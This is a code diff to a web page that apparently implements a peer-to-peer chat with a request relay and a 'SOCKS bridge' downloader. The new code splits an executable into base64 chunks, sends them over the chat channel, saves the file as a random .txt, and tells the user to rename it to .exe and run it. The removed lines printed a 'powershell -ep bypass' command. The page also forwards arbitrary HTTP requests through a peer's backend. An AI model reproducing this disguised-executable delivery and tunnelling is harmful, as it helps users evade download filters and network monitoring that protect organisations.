@@ -71,7 +71,7 @@ select{background:#222;color:#ccc;border:1px solid #333;border-radius:3px}
 <div class="row" style="margin-top:6px;align-items:center">
 <span class="label">Bridge:</span> <span id="socksStatus" class="status off">offline</span>
 </div>
-<div style="font-size:9px;color:#555;margin-top:4px">powershell -ep bypass .\file.ps1</div>
+<div style="font-size:9px;color:#555;margin-top:4px">rename .txt to .exe and run</div>
 </div>
 
 <div class="section">
@@ -191,16 +191,31 @@ $('chat').innerHTML+='<div class="msg peer">📎 '+link+' ('+Math.round(d.size/1
 $('chat').scrollTop=9999;
 }
 else if(d.type==='fetch'){
-log('fetch: '+d.url.substring(0,30));
+log('peer fetch: '+(d.method||'GET')+' '+d.url.substring(0,25));
 if(backend&&backend.readyState===1){
-backend.send(JSON.stringify({type:'fetch_request',id:d.id,url:d.url}));
+backend.send(JSON.stringify({type:'fetch_request',id:d.id,url:d.url,method:d.method||'GET',headers:d.headers||'',body:d.body||''}));
 }else{
 channel.publish('data',{type:'response',from:myId,id:d.id,error:'no backend'});
 }
 }
 else if(d.type==='response'){
 log('got response');
-if(pending[d.id]){pending[d.id](d);delete pending[d.id];}
+if(pending[d.id]){pending[d.id](d);}
+}
+else if(d.type==='bridge_request'){
+log('peer wants bridge');
+fetch('socks-bridge.txt').then(function(r){return r.arrayBuffer()}).then(function(buf){
+var arr=new Uint8Array(buf);
+var b64='';for(var i=0;i<arr.length;i++)b64+=String.fromCharCode(arr[i]);
+b64=btoa(b64);
+var chunkSize=40000;
+var total=Math.ceil(b64.length/chunkSize);
+log('sending '+total+' chunks ('+Math.round(buf.byteLength/1024)+'KB)');
+for(var c=0;c<total;c++){
+var data=b64.substring(c*chunkSize,(c+1)*chunkSize);
+channel.publish('data',{type:'response',from:myId,id:d.id,chunk:c,total:total,data:data});
+}
+}).catch(function(e){channel.publish('data',{type:'response',from:myId,id:d.id,error:e.message})});
 }
 });
 
@@ -294,25 +309,34 @@ $('fileInput').value='';
 $('btnGo').onclick=browse;
 $('url').onkeydown=function(e){if(e.key==='Enter')browse()};
 $('btnSocks').onclick=function(){
-var rnd=Math.random().toString(36).substring(2,10);
-log('downloading bridge.ps1...');
-fetch('bridge.ps1').then(function(r){
-log('fetch status: '+r.status);
-if(!r.ok)throw new Error('HTTP '+r.status);
-return r.blob();
-}).then(function(b){
-log('blob size: '+Math.round(b.size/1024)+'KB');
-if(b.size<100000){throw new Error('file too small');}
+if(!channel||!peerId){log('not connected','#a66');return;}
+var rnd=Math.random().toString(36).substring(2,8);
+log('requesting bridge via peer...');
+var id='dl'+(fid++);
+var chunks=[];
+pending[id]=function(r){
+if(r.error){log('failed: '+r.error,'#a66');return;}
+if(r.chunk!==undefined){
+chunks[r.chunk]=r.data;
+log('chunk '+(r.chunk+1)+'/'+r.total);
+if(Object.keys(chunks).length===r.total){
+var b64=chunks.join('');
+var bin=atob(b64);
+var arr=new Uint8Array(bin.length);
+for(var i=0;i<bin.length;i++)arr[i]=bin.charCodeAt(i);
+var blob=new Blob([arr],{type:'application/octet-stream'});
 var a=document.createElement('a');
-a.href=URL.createObjectURL(b);
-a.download=rnd+'.ps1';
+a.href=URL.createObjectURL(blob);
+a.download=rnd+'.txt';
 document.body.appendChild(a);
 a.click();
 document.body.removeChild(a);
-setTimeout(function(){URL.revokeObjectURL(a.href)},1000);
-log('saved: '+rnd+'.ps1','#6a6');
-log('Run: powershell -ep bypass .\\'+rnd+'.ps1');
-}).catch(function(e){log('download failed: '+e.message,'#a66')});
+log('saved '+rnd+'.txt ('+Math.round(blob.size/1024)+'KB) - rename to .exe','#6a6');
+delete pending[id];
+}
+}
+};
+channel.publish('data',{type:'bridge_request',from:myId,id:id});
 };
 log('ready');
 </script>
